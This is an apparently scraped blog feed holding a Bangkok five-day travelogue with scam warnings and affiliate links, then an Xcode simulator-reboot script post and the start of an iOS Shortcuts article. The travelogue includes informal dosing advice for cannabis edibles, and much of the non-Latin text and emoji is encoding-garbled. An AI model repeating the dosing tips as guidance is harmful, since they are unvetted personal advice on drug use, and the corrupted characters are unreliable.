SuperRich currency exchange inside.‚ö†Ô∏è Please note: The New Taiwan Dollar bills to be exchanged must not have stains, markings, etc., or they will be rejected. (For example, a 1000 NTD bill withdrawn from a Taiwan ATM with pencil markings was rejected for exchange.) NTD $5,000 exchanged for THB $5,200Khanom bueang Thai-style pancakesAfter exchanging money and having some cash, I replenished my energy at the food market on the first floor; I ate Thai crispy pancakes (‡∏Ç‡∏ô‡∏°‡πÄ‡∏ö‡∏∑‡πâ‡∏≠‡∏á), the sweet kind filled with meringue that tasted very sweet, like cotton candy, and also banana pancakes; finally, I bought a cup of iced coffee and continued on.Grand Palace and Temple of the Emerald BuddhaTicket: THB 500/person. üëâüëâüëâKKday offers: Grand Palace and Wat Phra Kaew Guided Tour (English, Thai, Chinese, Japanese), for those who want to learn more about the history.Walking back to the Grand Palace (the Temple of the Emerald Buddha is inside the Grand Palace), there are many government buildings along the way.There is a dress code for entering the Grand Palace, so please pay special attention! No shorts, off-shoulder tops, ripped jeans, capri pants, short skirts, etc. ‚ö†Ô∏è Crowded places, beware of pickpockets ‚ö†Ô∏èYaksha GatekeeperYaksha and MonkeyLodena Stupa„ÄäRamakien„Äã MuralsImage source: Trueplookpanya ‚ö†Ô∏èPhotography is prohibited at the Jade Buddha‚ö†Ô∏è The clothing varies with each season; this time, the second type of outfit was seen.Grand Palace13:20 LunchThe time was around 1 PM. After leaving the Grand Palace, we grabbed lunch at a Western restaurant near the pier.14:00 Prepare to board the boat to Wat Arun ‚ö†Ô∏è Outside the pier, people may approach you asking where you‚Äôre going. Be cautious, as they are private boat operators charging high fees (THB 500, 1000) and are unsafe; ignore them and find the official pier and counter to state your destination. ‚ö†Ô∏è The official fare is only THB 30 ( Tha Chang to Wat Arun), the new boats have air conditioning, are safe, and comfortable.When the boat arrives, the staff will call out ‚ÄúÈÑ≠ÁéãÂªü‚Äù (yes, in Chinese). If you‚Äôre unsure, you can always ask.The afternoon is approaching with thunderstorms, and you can see the water flowing turbid and fast.The boat is very new, the air conditioning is cool, it is enclosed and very safe, and there are many convenient schedules!Station staff will also call out ‚ÄúZheng Wang Temple.‚Äù14:30 Arrive at Wat ArunTicket Price: THB 200After getting off the boat, you will arrive at the King Rama Shrine, where you can queue up directly to buy tickets for entry. ‚ö†Ô∏è Cheng Wang Temple also has a dress code ‚ö†Ô∏è No off-shoulder tops, shorts, crop tops, or short skirts allowed. You can wear traditional Thai clothing; many people wear it for photos.You can walk to the middle platform to take photos (‚ö†Ô∏è the stairs are steep, so be careful). Many people also change into traditional Thai costumes here for photo souvenirs. üëâüëâüëâ KKday Experience Recommendations: - Thai Costume Experience with Photo Tour at Wat Arun in Bangkok, Thailand - Wat Pho and Wat Arun 3-Hour Walking TourAfter visiting, return to the pier and first find the ticket booth (PIER 2) to buy a ticket to ICONSIAM (THB 40), then go to PIER 1 to board.Also a comfortable and safe new ship!15:00 ICONSIAMICONSIAM is very large and looks luxurious. The food court on the first floor is quite unique.Buy a cup of ChaTraMue Thai Tea to recharge your energy.Walked all the way to the BTS Charoen Nakhon platform, decided to get a one-hour foot massage first.There is a newer, larger place outside called (1) THAI GARDEN MASSAGE, but they had no available spots when I asked. Fortunately, I kept walking and found (2) another massage shop with seats as shown in the picture. I found it very comfortable, less crowded, spacious, quieter, and the price was cheap (foot massage/1 hour/THB 270).After pressing it, I had the energy to continue shopping and returned to ICONSIAM; walking all the way to the upstairs restaurant, which was also very extravagant, with a jungle, small bridges with flowing water, and waterfalls. Overall, it was very nice! Bought the famous Japanese potato sticks TORO FRIES (long queue) to recharge. Here they also have Japanese % coffee.Going to LHAO LHAO for a Dinner AppointmentThis is a branch line with only three stops and fewer services. Google Map seems to have no information about this BTS line; it suggests I walk to Krung Thon Buri.From here, take one stop to Krung Thon Buri, which is on the Silom Line.Bangkok also has LAWSON!At Siam, transfer to the Sukhumvit Line and get off at Ari station. A short walk from there is the LHAO LHAO restaurant.19:00 LHAO LHAOThe owner seems to be Chinese, and it feels like a fusion of Chinese and Thai cuisine. It‚Äôs a highly rated, well-established restaurant and apparently a favorite of Blackpink‚Äôs LISA.Because I‚Äôm going to a pub to listen to live music later, I ate quickly, but I thought every dish was very delicious!! In Figures 1‚Äì3 above, the background behind the Goose Brand cooling ointment, the dish that looks like minced pork, is called ‡∏´‡∏°‡∏π‡∏™‡∏±‡∏ö‡∏ú‡∏±‡∏î‡∏´‡∏ô‡∏≥‡πÄ‡∏•‡∏µ‡πâ‡∏¢‡∏ö. It appears to be olive vegetable stir-fried with minced meat, and it pairs very well with rice! In Figure 2-1 above, fried oyster omelette, similar to the bomb oyster omelette at Taiwan‚Äôs Shilin Night Market. Figure 2-2 above, seasonal limited drink, Longan Tea In Figure 2-3 above, the most special dish is the curry crab (Panang Curry), made with a whole fresh large crab. The Thai-recommended Eagle Brand cooling balm, which I later bought, smells milder than menthol nasal inhalers and causes less nasal irritation!20:00 The Rock PubAfter eating, head to The Rock Pub for drinks and live music.Activities of the Day:https://www.instagram.com/p/C91ZVwtxR32/Rundown:‚Ä¢ 20.00-21.00: A LIKELY LAD(Kings Of Leon/Blur/Arcade Fire and more)‚Ä¢ 21.15-22.15: COUNTING DUCKS(Radiohead/The Strokes/The Killers and more)‚Ä¢ 22.30-00.00 : THE CHOCOLATE COSMOS(Arctic Monkeys/Joy Division/The Cure/The Smiths and more)‚Ä¢ 00.15-01.15: LIAM FT. HENSHIN(Oasis and more)Price: THB 350 including one drink (alcohol), advance ticket purchase and reservation required. Learned a Thai trivia: You cannot take photos of alcohol labels because it may be seen as promoting drinking. As shown in image 3, the label must be covered.Four performances, all rock and classic oldies!The ones I‚Äôve heard of are: Coldplay, Radiohead, Kings of Leon, Arcade Fire, Oasis, The Killers‚Ä¶.We left around 11:00 PM because it was getting late. The entire performance was very high quality! Both the singing skills and live performance were impressive. Truly amazing!Returned to the hotel to give Chun-Hsiu Liu Taiwanese souvenirs, then dispersed to rest.8/04 Day 3 Chatuchak Market, King Power Mahanakhon Building, Central Rama 99:30 Breakfast: Wang Chunsheng Beef Hotpot, Beef Offal HotpotCat lover here, Bangkok has many cats, and they immediately come to rub against me.Early in the morning, I took a Grab to Wang Chun Sheng Beef Hotpot for breakfast. The overall flavor is quite Chinese/Taiwanese style, which I liked, but Tainan beef soup is even better. After eating, I headed to Chatuchak Market. Since Chatuchak is quite far and I didn‚Äôt want to walk or transfer BTS, I took an Uber directly (THB 374). üëâüëâüëâ KKday Chatuchak Market | Bangkok Private Transfer Service10:45 Arrive at Chatuchak MarketChatuchak Electronic Map (chatuchak market map) Click HereChatuchak covers a large area with dense vendors, but it is generally clean and pleasant to explore. However, many items are repetitive and appear to be Made in China products aimed at tourists.Finally, I only bought a Thai brand, Thailand Phutawan indoor diffuser, as a souvenir.If you get tired from walking, just step into the massage shop inside for foot and some shoulder and neck massage. (1 hour/THB 250)RestroomIf you need to use the restroom at Chatuchak, there are paid toilets (THB 5 per use) around the market. I have used them; they are very clean, with one stall per person, and are regularly cleaned. If you don‚Äôt want to pay, you can also go to the nearby Mixt Chatuchak mall, which has free and equally clean restrooms.Mixt ChatuchakSeafood RiceLunch was casually had at a restaurant inside the Mixt Chatuchak mall, and the food was quite good.After eating, we continued exploring and bought a cup of durian juice to drink. The flavor was rich and authentic, and the price was reasonable (THB 89). Later, I found that items at Chatuchak are actually cheaper. For example, a pack of 6 peppermint nasal inhalers costs 99 baht here, while Big C sells the same pack for 140 baht‚Ä¶ also, durian juice is similar, sold for over 140 baht per cup in city night markets.15:00 Take the BTS to King Power Mahanakhon BuildingChatuchak is closer to the MRT, but we need to go to the King Power Complex at BTS Chong Nonsi station; walking from Chatuchak to the nearest BTS Saphan Khwai station is about 1 KM (15 mins).King Power Mahanakhon (Bangkok Grand Kyoto Building)Ticket Price: THB 1,080/person üëâüëâüëâ It is recommended to buy tickets from KKday first for a cheaper price: King Power Mahanakhon SkyWalk Bangkok Ticket (free cancellation 2 days in advance)Up close, it‚Äôs not as tall as imagined, but the architectural style is unique, with a cyber-bit aesthetic.You must go through security check first. After buying the ticket, free storage is provided. Backpacks are not allowed inside (small waist bags are permitted). Before taking the elevator, you can choose to take a photo (the ticket includes a series of free digitally composed photos; physical photos require an extra fee).Free synthesized digital photos; after visiting, staff will guide you to download them when you come down the elevatorThe express elevator features a 360-degree panoramic animation, similar to Taipei 101 and Tokyo Skytree; its height is roughly comparable to Tokyo Tower.The elevator first stops at the indoor observation deck on the 74th floor, where there is a caf√© and public seating for a short break. To reach the outdoor observation deck on the top floor, you need to transfer to another elevator or take the stairs up to the 78th floor.On the 78th floor, there is a small bar where you can order a drink and enjoy the view while sitting.After reaching the 78th floor, you can continue upwards to the stairs and the rooftop lounge.The rooftop offers a panoramic view of the entire Bangkok city, and you can imagine the night view must be beautiful as well!The stairs and rooftop lounge face the famous transparent glass corridor, offering a direct vertical view of the ground. You can take shoe covers from the nearby box to enter, but bringing phones is prohibited. You can ask a companion or staff to help take photos.The entire glass corridor isn‚Äôt very large, about the size of a hotel‚Äôs rooftop infinity pool. From the side, it doesn‚Äôt seem very high, but actually walking on it can be scary and make your legs weak XDJod Night Market (formerly Ratchada Train Night Market)MRT can be accessed directly with a credit card.To get to Central Rama 9, you need to transfer to the MRT subway to Phra Ram 9 station. You cannot use the Rabbit Card; you must buy a ticket or you can now use a VISA card to tap in and out directly. Tested with Taishin GoGo Card, it works; Cathay Cube not tested.For dinner here, I have to say Bangkok‚Äôs night markets and bazaars are far better than Taiwan‚Äôs. The overall environment is clean, there are seating areas, it‚Äôs not chaotic, and well organized, making it very comfortable to explore.After walking around, I first tried the dessert on the left (similar to egg waffles?), and the savory seafood grill on the right. Both have a chewy texture and taste quite good.Next is the highlight, the volcano ribs. The flavor is quite unique, with a lemongrass sour and spicy sauce. You can put on gloves and eat it with your hands, which is very appetizing!After eating, I bought coconut ice cream with mango and peanut dessert from another stall, which was also delicious!After eating, return to Central Rama 9 for some shopping. There is also the famous NaRaYa Bangkok bags here.On the way back to the hotel, I happened to see Bangkok after the rain paired with colorful digital advertising screens. The color contrast was maxed out, giving a strong cyberpunk vibe.7‚Äì11 Grilled Toast Late-Night SnackOn the way back to the hotel, I tried Thailand‚Äôs convenience store grilled toast and Thai banana milk. The filling was melted cheese and hot dog, and the crust was crispy! The crust was crispy! The crust was crispy! It was delicious and cheap!8/05 Day 4 Central World, Big C, Terminal 21 Didn‚Äôt sleep well all night + hungover all day, feeling dazed.Central WorldWent out to Central World for shopping right after waking up in the morning.On the first floor, there is a SHAKE SHACK burger. I tried it for the first time and ordered the signature SHAKE SHACK burger and the coconut milk shake, which is only available in Bangkok. The burger was tasty and not greasy, but I found the milkshake too sweet.It‚Äôs very large, just like ICONSIAM. If you want to explore thoroughly, you can‚Äôt finish‚Ä¶ I just took a quick look around and casually bought a shirt.Big CAfter shopping at Central World, just walk across to Big C to buy snacks and souvenirs. (There are many options, but I don‚Äôt think it‚Äôs cheaper‚Ä¶)Bottom left Phutawan indoor diffuser was bought yesterday at Chatuchak, but I guess department stores in the city also carry it.Additionally, Big C now seems to no longer provide plastic bags; you need to buy reusable bags inside the store. That big pack of dried durian actually contains only two small packs inside‚Ä¶ but it tastes quite good.LunchThe outdoor plaza at Central World hosts a food market event, which is more than just simple stalls and tents. It has a main theme, and this time it‚Äôs Titanic. You can enter for free by following their official YouTube channel. The interior is also decorated very elaborately.But for lunch, we went to SHAKE SHACK again and tried the chicken thigh burger this time, which was equally delicious.Afternoon: Return to the hotel for a nap due to poor sleep and hangover‚Ä¶ feeling extremely tiredDinner at Terminal 21 Airport MallTerminal 21 is also endless to explore, with each floor featuring a different regional theme. For example, the Japan floor mainly sells Japanese products and has Japanese restaurants.Mainly arranged to eat at the food court upstairs with Chun-Hsiu Liu. ( Affordable and delicious, highly recommended dining spot )At the food court, find a seat yourself; many locals also come here to eat. ‚ö†Ô∏è Payment method here: the store does not accept direct payment. You must first go to the counter to exchange cash for a food card, then use the QR code on the food card to pay; after eating, return the card to the counter for a refund. (No deposit or handling fee required)There are quite a few options. Just queue up, say your number, and pay with the food card QR code. Takeout is also available (I recall an extra THB 10 packaging fee).Ordered seafood fried instant noodles (THB 50) + pork chop with fries (THB 59) = THB 109After eating, I also took a box of mango sticky rice to go for a late-night snack back at the hotel.The food is really delicious and cheap!!! A meal at a restaurant outside usually starts at 200‚Äì300 THB, but here almost every meal costs only 50‚Äì80 THB.After eating, we went for a walk in the nearby Banjachit Park and tried to find the legendary Bangkok Giant Lizard; maybe because it was evening, we didn‚Äôt see any. ‚ö†Ô∏èEncountered the legendary foreigner scam on the way back to the hotel:‚ö†Ô∏è Waiting for the BTS on the platform‚Ä¶ Looked like someone from the Middle East, came up to start a conversation - Asking if you are Thai, if you speak English, and where you are from - I say Taiwan - He just said, ‚ÄúOh‚Ä¶ Taiwan, I love Taiwan‚Äù But from his pronunciation, it‚Äôs clear he doesn‚Äôt know Taiwan at all‚Ä¶ - Then he said he wanted to exchange money, but SuperRich was closed. He asked me how much Thai Baht he could get for 100 US dollars. I just felt something was off, so I ignored him and left‚Ä¶ Their methods are similar, or they ask what your country‚Äôs currency looks like, curious if you can show it to them. Then, while you take out your wallet, they pickpocket or snatch your money and run away.Back at the hotel, my travel companions bought some mangosteen to try. I found the fresh ones delicious, with a light sweetness combined with the mangosteen flavor, making it very smooth. Later, I tried dried mangosteen, but it didn‚Äôt taste as good‚Äîjust dry and sour. As for durians, durians in Bangkok are not cheaper‚Ä¶ a whole durian costs THB 200 ‚Äì 300.8/06 Day 5 Return TripBangkok Monitor LizardIn the morning, still determined, I went to Lumphini Park to find the legendary Bangkok monitor lizard. Due to limited time, I only found a medium-sized lizard basking in the sun. Looking for large monitor lizards was just a personal boring activity. Locals reportedly dislike these lizards (water monitors) because they eat dirty things. Avoid touching them casually.12:00 Return to the hotel to pick up luggage and head to the airportThe flight is at 15:20, so we need to leave by noon. It takes about an hour to get from the city to the airport. üëâüëâüëâYou can refer to KKday airport transfer services: - Thailand | Airport Private Transfer | Suvarnabhumi Airport (BKK) / Don Mueang Airport (DMK) ‚Äî Bangkok/Pattaya/Hua Hin City Hotels - Bangkok Airport Transfer | Private Car from Bangkok City to Suvarnabhumi Airport (BKK) / Don Mueang Airport (DMK)Starting from the hotel, Grab fare: THB 577, highway toll applies; the driver will pay the toll first, and the toll fee will be added to the final Grab card payment. (I recall it was around THB 50)Checked baggage is limited to 15 kg, strictly adhered to.BKK Yaksha Gate Guardian.After exiting immigration around 13:20, the security at Bangkok airport is quite strict. Everything must go through security screening, and almost all carry-on luggage needs to be opened for manual inspection.After passing through immigration and security, there was about an hour left to eat; I found a Thai restaurant and had my last meal in Thailand. (Seafood fried rice, mango juice, mango sticky rice). After leaving the country, many shops sell mango sticky rice in takeout boxes, so you can buy some to eat on the plane if you‚Äôre still hungry! (‚ö†Ô∏èBut remember, strictly prohibited to bring back to Taiwan‚ö†Ô∏è)This bottle of water deserves a close-up because budget airlines don‚Äôt provide anything. I thought about buying water at the airport to drink on the plane, but after security, bottled water costs between THB 70 and 100, and this one is THB 100.BKK is huge‚Ä¶ full of Trip.com ads. The return flight was on time, so I took the shuttle to the airport right away.Back to TaiwanArriving at TPE Taiwan Taoyuan International Airport, after picking up your luggage around 20:45, take the 1841 or 1819 Kuokuang Bus directly back to Taipei. It‚Äôs very convenient without any transfers~‚ö†Ô∏èTravel Safety and Precautions in Bangkok, Thailand‚ö†Ô∏èThe most important thing when going out is safety. Here is a summary of safety tips and precautions.Fraud and Scam PreventionThe following summary is based on a video by Bangkok Cat. This time, I really encountered the currency exchange scam mentioned. Miscalculating the billIt‚Äôs not always intentional; you might miscalculate the total amount when ordering. Approaching you first to ask about your country‚Äôs currency or exchanging moneyWhen you take out your wallet, they may steal, pickpocket, or snatch it away. Outside the Grand Palace or attractions, they falsely claim the site is closed and eagerly suggest you take a tuk-tuk to other places (black temples/black shops/this time at the pier, we encountered private tour boats that are black boats) to scam you. Tuk-tuks shouting prices everywhere, suddenly raising fares halfwayIf you want to try tuk-tuks but fear being overcharged, you can try the new MUVMI app, a tuk-tuk booking appEven seemingly reliable tuk-tuks require caution against scams, such as overly eager drivers offering to take you to attractions or boat rides. Fake staff: While waiting in line, fake staff will eagerly invite you inside.They will introduce dishes in your language, help you order, then say you need to pay first. After taking the money, they run away. Motorbike Rental ScamsDo not leave your passport as collateral, do not leave your passport as collateral, do not leave your passport as collateral.If you face malicious claims of damage requiring compensation, leaving your passport will cause trouble.Choose large chain rental companies and record a video of the vehicle‚Äôs condition before renting. Local Dating App ScamsYou might encounter transgender individuals, honey traps, or scammers. The Papong Ping Pong Show scam involves enthusiastic street touts asking if you want to see the ping pong show. They say you only need to buy a 100 THB drink, then lead you into a dark alley or a second-floor black shop.The show is terrible, and when you try to leave, they demand 3,000 THB, claiming the 100 THB price never existed. Be careful of pickpockets in crowded places, even at ticketed entrances (e.g., Grand Palace, Wat Pho). üåøüö¨It will be banned next year, but I can share some experience. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èEdibles (like gummies) have a strong effect, and the scary part is that when you eat them, they feel just like regular gummies with no sensation, but a few hours later, the effects suddenly kick in‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è It‚Äôs best to try gradually: eat 1/3 and wait a few hours. If no issues, eat 2/3 and wait a few hours. If you feel something, then try taking one whole pill‚Ä¶ Choosing based on your body type is best done gradually. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è Strongly recommend trying only inside the hotel. If you feel dizzy, rest immediately for safety ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è Being able to drink alcohol does not mean you have a higher tolerance. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è Heart rate may increase and cause discomfort ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è There needs to be someone awake to take care of things, which is safer. Smoking is only allowed on specific occasions. Others Thailand is not a tipping culture country, so generally you don‚Äôt need to tip; I only give a THB 20 tip for massages as a small gesture. Alcohol sales are only allowed from 11:00 to 14:00 and 17:00 to 24:00. Alcohol sales are prohibited all day on Buddhist holidays. Hotel balconies do not always allow smoking; you need to ask. Emergency Hotline for Foreigners in Foreign Languages: Dial 1155 SuperRich has business hours, so if you arrive too early or too late, you won‚Äôt be able to exchange money. Appendix ‚Äî 2018 Digital Technology Bangkok Huaxin 5-Day Staff Trip Just memories and some itinerary for your reference, details may not be accurate.Digital Technology 2018 Staff Trip ‚ö†Ô∏èThe following are photos and records from 2018, for reference only‚ö†Ô∏è ‚ö†Ô∏èThe following are photos and records from 2018, for reference only‚ö†Ô∏è ‚ö†Ô∏èThe following are photos and records from 2018, for reference only‚ö†Ô∏èDay1Moai Cafe - Easter Island Moai Statues Cafe (Closed)Colleagues (2024) also mentioned that Bangkok has many trendy cafes that are quite extravagant. Interested friends can look them up. This cafe had low ratings and is now closed.Dinner ‚Äî Chom View Seafood Êµ∑ÊôØÊµ∑ÈÆÆÈ§êÂª≥Stay 2 Nights ‚Äî SHERATON HUA HIN RESORT &amp; SPA Hua Hin SheratonSource: SHERATON HUA HIN RESORT &amp; SPAI didn‚Äôt take many hotel photos, just one shocking picture I took in the morning when I woke up and found a giant millipede in my blanket.Day 2Santorini Park Greek-style Town (Closed)[Hua Hin Cha-am Attractions] Santorini Park: A Highly Photogenic Little Greece in Thailand | BringYouOn the way from Bangkok to Hua Hin, in the Cha-am area, there is a Greek-style ‚ÄúSantorini Park.‚Äù It is a popular weekend spot for Thai families to relax and stroll. If you love photography, this romantic park is highly recommended. www.bring-you.infoIt seems like a small amusement park combined with a department store, featuring Greek-themed scenery.Hua Hin Artist VillageA fairly famous attraction, still open in 2024.There are many paintings and artworks.Return to Sheraton Hotel to Enjoy Facilities and the BeachThe hotel is in a villa style, with each room being a standalone unit. The swimming pool surrounds every room in the hotel, and there is a bar next to the pool. The beach outside is an undeveloped area, completely barren.After dinner, order from the buffet and stroll around the nearby night market.Day 3Maeklong Railway MarketIt‚Äôs too early, everyone gave up and didn‚Äôt go.Damnoen Saduak Floating Market üëâüëâüëâ These two attractions have inconvenient transportation; you can refer to KKday tours: - Bangkok Classic One-Day Tour | Maeklong Railway and Damnoen Saduak Floating Market | From Bangkok -„ÄêThailand„ÄëBangkok Half-Day Private TourÔΩúMaeklong Railway Market ‚Äî Amphawa Floating Market ‚Äî Amphawa Firefly River CruiseIt felt quite thrilling and adventurous, even though the water was murky and had a smell.Travel to Bangkok and Stay (2 days) Marriott Queens Park BangkokHEALTH LAND 2-hour full-body Thai massageThe tour guide specifically told the shop not to do back stepping. I only remember it felt very high-end, but pressing on the sides was painful and kept me awake XDRiver City Shopping ComplexSince we are going on the Chao Phraya Princess Cruise with a buffet dinner tonight, we first visited the department store near the pier.Chao Phraya Princess Cruise Buffet Dinner üëâüëâüëâ Advance booking is required. You can refer to KKday‚Äôs Chao Phraya Princess River Cruise with Dinner BuffetÔΩúChao Phraya Princess River Cruise .The food was okay, but the main highlight was the beautiful night view, where you can see the lights of the Bangkok Riverside Night Market Ferris Wheel.After returning to the hotel, I had a few drinks at the bar upstairs in the Marriott. I only remember the beautiful night view and the cheap drinks.Day 4 Free DayOnly remember visiting department stores, Big C, and Central World.Evening visit to Zoom Sky Bar at JC Kevin Hotel Sathorn, Bangkok for a drink This is the hotel I stayed at this time XDDay 5 Return TripThat sums up the memories of the 2018 staff trip. This time, a fully independent trip back to Bangkok made me more familiar with the city. Compared to before, I feel it is more bustling, the food is better, and prices have increased.‚Äî ‚Äî ‚ÄîParty Room / BBQ Venue Platform for Hong Kong People ‚Äî Common Room Booking PlatformCommon RoomWhether you want to find a party room to celebrate or rent a hotel/guesthouse for a short stay, you can use the Common Room platform to easily find your ideal venue!You can now also book Hong Kong‚Äôs ferry rides.For friends planning to travel to Hong Kong and want to try different venues, you can check it out immediately: Common Room Booking Platform.‚Äî ‚Äî ‚ÄîüëâüëâüëâKKday Plan Recommendations: Chao Phraya Princess River Cruise Dinner BuffetÔΩúChao Phraya Princess River Cruise Bangkok Classic One-Day Tour | Maeklong Railway and Damnoen Saduak Floating Market | Depart from Bangkok [Thailand] Half-day Private Tour in Bangkok | Maeklong Railway Market ‚Äî Amphawa Floating Market ‚Äî Amphawa Firefly River Cruise King Power Mahanakhon SkyWalk Bangkok Ticket Thailand Airport BKK Departure Meet and Greet Fast VIP Service Thailand SIM CardÔΩúAIS 5G High-Speed Network 8 Days Unlimited Data + Calls eSIM ThailandÔΩúAirport Private TransferÔΩúSuvarnabhumi Airport (BKK) / Don Mueang Airport (DMK) ‚Äî Bangkok/Pattaya/Hua Hin City Hotels Bangkok Airport Transfer | Private Car from Bangkok City to Suvarnabhumi Airport (BKK) / Don Mueang Airport (DMK) If this article is helpful to you, please consider using my referral link to purchase KKday products and tours. I will receive a commission to continue creating more travel content. Thank you.If you have any questions or suggestions, feel free to contact me.More Travelogues Tokyo Area Travel GuideÔΩúKawagoe Little Edo &amp; Atami Fireworks Festival 5-Day Itinerary Busan Travel GuideÔΩú8-Day Itinerary with VISIT BUSAN PASS for Seamless Exploration San‚Äôin &amp; Kansai 7-Day Solo TripÔΩúExplore Izumo, Matsue, Tottori, Himeji, Osaka, Kobe Bangkok Travel GuideÔΩú5-Day Independent Trip Highlights in Thailand Kyushu 9-Day Independent TripÔΩúBusan to Hakata Cruise Entry and Scenic Tours Sanyo Region Travel GuideÔΩú6-Day Hiroshima &amp; Okayama Itinerary for Freedom Seekers Kyushu 10-Day Solo Travel GuideÔΩúExplore Fukuoka, Nagasaki &amp; Kumamoto Efficiently Nagoya One-Day Quick TripÔΩúPeach Aviation Flight Experience and Travel Tips Tokyo 5-Day Travel GuideÔΩúTop Tips for Food, Stay &amp; Transport Kyoto Osaka Kobe 8-Day ItineraryÔΩúFree Travel Guide with Food, Stay &amp; Transit TipsFound this guide useful? Use my KKday referral link to book your trip‚ÄîI‚Äôll earn a small commission to support more content like this. Thank you! üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Temporary WorkaroundÔΩúFix Black Launch Screen Bug After Multiple Launches", "url": "/posts/zrealm-dev/ios-temporary-workaround-fix-black-launch-screen-bug-after-multiple-launches-7584f643c0aa/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, xcode, simulator, bugs, apple", "date": "2024-08-20 23:32:04 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![iOS] Temporary Workaround for Black Launch Screen Bug After Several LaunchesT...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![iOS] Temporary Workaround for Black Launch Screen Bug After Several LaunchesTemporary Workaround to Fix XCode Build &amp; Run App Stuck on Black Screen IssuePhoto by Etienne GirardetQuestionNot sure which XCode version started this (probably 14?), but some projects freeze on a black screen after multiple Build &amp; Run attempts on the simulator. The status gets stuck at Launching Application‚Ä¶ with no response; rebuilding and rerunning doesn‚Äôt help. You need to manually kill the entire simulator and restart it to fix the issue.XCode 14.1: Stuck at ‚ÄúLaunching Ap. . . | Apple Developer ForumsHello team, On Xcode 14.1, After building the project and when the simulator launches, it shows blank black screen‚Ä¶ forums.developer.apple.comNew projects and new project settings rarely encounter this issue; older projects face it more often. However, due to their long history and complex settings, no definite root cause can be found online. It is mostly suspected to be an XCode bug (or M1?). This problem is very annoying because when building and running to check results, the screen often goes black, forcing a complete restart. Each time wastes about 1‚Äì2 minutes and disrupts development.WorkaroundHere is a workaround based on the idea that if we can‚Äôt avoid the black screen issue, and the black screen does not appear during the first Build &amp; Run on the simulator, then we just need to ensure that each Build &amp; Run uses a freshly restarted simulator.First, we need to get the Device UUID of the simulator you want to run.Run in Terminal:xcrun simctl list devices Find the emulator device you want to use and its Device UUID Here I use my iPhone 15 Pro (iOS 17.5) as an exampleDevice UUID = 08C43D34‚Äì9BF0‚Äì42CF-B1B9‚Äì1E92838413CC Next, let‚Äôs add a new auto-reboot.sh Shell Script file cd /The directory where you want to place this script/ vi auto-reboot.sh Paste the following Script: Replace [Device UUID] with the Device UUID of the simulator you want to use. Remember to update the Device UUID in this script if the simulator is changed; otherwise, it will not work. #!/bin/bash## Use the command below to find the Device UUID of the simulator you want to use:## xcrun simctl list devices# shutdown simulatorxcrun simctl shutdown [Device UUID]# reboot simulatorxcrun simctl boot [Device UUID] The script logic is straightforward: just close &amp; restart the emulator you want to use. ESC &amp; :wq! Adjust auto-reboot.sh Execution Permissions:chmod +x auto-reboot.shBack to XCode SettingsBecause everyone uses different simulators, I set it in XCode Behaviors to avoid changing the project settings or affecting the team via git; however, for a simple, team-wide sync, you can set it directly in Scheme -&gt; Build -&gt; Pre-actions -&gt; sh /path/to/your/script/auto-reboot.sh.XCode Behaviors XCode -&gt; Behaviors -&gt; Edit Behaviors‚Ä¶ Find the Running section Select the Completes optionCompletes timing = Stop or Rebuild Check Run on the right side Choose Choose Script‚Ä¶ to select the location of the newly created auto-reboot.sh file. Completed Principle and ConclusionThe demo is a clean project, so the build time is very short.We use XCode Behaviors to restart the simulator at the Completes (Stop or Rebuild) stage, before the Build starts. This almost always completes the restart before the Build -&gt; Run finishes.If you repeatedly press restart, it may cause the reboot to be too slow, resulting in Run not finding the target and causing another type of black screen. However, this situation will not be considered. At least this solution can keep Build &amp; Run App running normally during daily use.The impact on speed is fine, because Build &amp; Run itself takes some time, which is enough time for the emulator to restart.If you have any questions or suggestions, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Shortcut AutomationÔΩúAuto-Forward SMS & Create Reminder Tasks Effortlessly", "url": "/posts/zrealm-robotic-process-automation/ios-shortcut-automation-auto-forward-sms-create-reminder-tasks-effortlessly-309d0302877b/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, automation, rpa-solutions, shortcuts, ios, english, ai-translation", "date": "2024-08-19 23:56:48 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS Shortcut Automation Use Case ‚Äî Automatically Forward SMS and Create Remind...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS Shortcut Automation Use Case ‚Äî Automatically Forward SMS and Create Reminder TasksiOS Using Shortcuts: A Few Simple Steps to Automatically Forward Specific SMS to Line and Automatically Create Package Delivery Pickup and Credit Card Payment Reminder To-Do ItemsPhoto by Jakub ≈ªerdzickiBackgroundÊç∑Âæë 